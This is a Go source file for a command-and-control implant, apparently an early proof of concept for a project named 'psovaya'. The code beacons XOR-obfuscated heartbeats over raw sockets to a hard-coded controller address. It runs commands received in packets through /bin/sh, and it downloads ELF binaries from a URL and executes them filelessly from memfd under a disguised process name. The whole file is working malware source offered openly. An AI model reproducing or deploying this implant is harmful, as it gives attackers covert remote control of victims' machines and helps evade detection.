package main

/*
Working on C2, Currently using rawsocket C2 source as POC.
Additional functionality and code edits will be made in the future.

Look at the github repo for rawsocket for more information :3
*/

import (
	"fmt"
	"log"
	"net"
	"os/exec"
	"psovaya/pkg/dropper"
	"psovaya/pkg/rawsocket"
	"strings"
	"time"

	"github.com/google/gopacket"
	"golang.org/x/sys/unix"
)

var lastCmdRan string

func generateHeartbeat(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
	for {
		fd := rawsocket.NewSocket()
		defer unix.Close(fd)

		// Create Cmd -> Encrypt -> Wrap with Identifier
		data := rawsocket.CreateHello(iface.HardwareAddr, src)
		data = rawsocket.XORCipher(data)
		data = rawsocket.AddIdentifier(data, true)

		// Send Packet
		packet := rawsocket.CreatePacket(iface, src, dst, 18000, 56969, dstMAC, data)
		addr := rawsocket.CreateAddrStruct(iface)
		rawsocket.SendPacket(fd, iface, addr, packet)

		fmt.Println("[+] Sent HELLO")
		time.Sleep(30 * time.Second)
	}
}

func dropBinary(url string, procname string) {
	elfContent := dropper.RetrieveFile(url)

	// Create fd and Inject Code
	fd := dropper.MemfdCreate("")
	dropper.WriteToMemfd(fd, elfContent)
	dropper.ExecMemfd(fd, procname)
}

func implantProcessPacket(packet gopacket.Packet, hostIP net.IP) {
	data := rawsocket.RemoveIdentifier(string(packet.ApplicationLayer().Payload()), false)
	data = rawsocket.XORCipher(data)
	data = strings.Trim(data, "\n")

	// Split into list to get command and args
	payload := strings.Split(data, " ")
	fmt.Println("[+] PAYLOAD:", payload)

	// Split the string to get the important parts
	// Rejoin string to put into a single bash command string
	switch payload[0] {
	case "COMMAND:":
		command := strings.Join(payload[1:], " ")
		execCommand(command)
	case "DEPLOY:":
		dropBinary(payload[1], payload[2])
	}
}

func execCommand(command string) {
	// Only run command if we didn't just run it
	if lastCmdRan != command {
		fmt.Println("[+] COMMAND:", command)

		// Run the command and get output
		_, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
		if err != nil {
			fmt.Println("\n[-] ERROR:", err)
		}
		// Save last command we just ran
		lastCmdRan = command
		// fmt.Println("[+] OUTPUT:", string(out))
	}
}

func main() {
	/* rawsocket Init */
	// Create BPF filter vm
	vm := rawsocket.CreateBPFVM(rawsocket.FilterRaw)

	// Create reading socket
	readfd := rawsocket.NewSocket()
	defer unix.Close(readfd)
	fmt.Println("[+] Socket created")

	// Get information that is needed for networking
	iface, src := rawsocket.GetOutwardIface("192.168.1.202:8000")

	dstMAC, err := rawsocket.GetRouterMAC()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] DST MAC:", dstMAC.String())
	fmt.Println("[+] Listening")

	go generateHeartbeat(iface, src, net.IPv4(192, 168, 1, 202), dstMAC)

	for {
		packet := rawsocket.ReadPacket(readfd, vm, false)
		if packet != nil {
			go implantProcessPacket(packet, src)
		}
	}

}
